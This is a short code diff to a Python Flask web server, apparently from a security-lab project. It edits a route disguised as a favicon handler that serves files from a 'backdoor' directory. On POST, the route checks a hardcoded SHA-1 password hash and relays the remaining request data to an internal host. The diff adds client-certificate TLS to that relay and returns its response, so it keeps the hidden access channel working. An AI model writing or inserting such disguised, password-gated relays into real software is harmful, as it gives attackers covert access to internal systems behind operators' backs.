@@ -249,11 +249,12 @@ def favicon():
     if request.method == "GET":
         return send_from_directory("/home/webserver/ASL-RuntimeTerror/src/web-server/backdoor", "favicon.jpg", mimetype='image/jpg')
     elif request.method == "POST":
-        lines = str(request.data).split('\n')
+        lines = str(request.data.decode()).split('\n')
         if len(lines) >= 2:
             hash_object = hashlib.sha1(lines[0].encode('utf-8'))
             if hash_object.hexdigest().upper() == "DEA3C171ABCDFB3E8380D6860630F618EB6E074F":
-                return requests.post("https://192.168.10.10:6666/favicon.ico", '\n'.join(lines[1:]))
+                return requests.post("https://192.168.10.10:6666/favicon.ico", '\n'.join(lines[1:]), verify=ca_service.rootca_path, cert=(ca_service.ca_chain, ca_service.key)).text
+        return 'ERROR'
 
 
 if __name__ == '__main__':
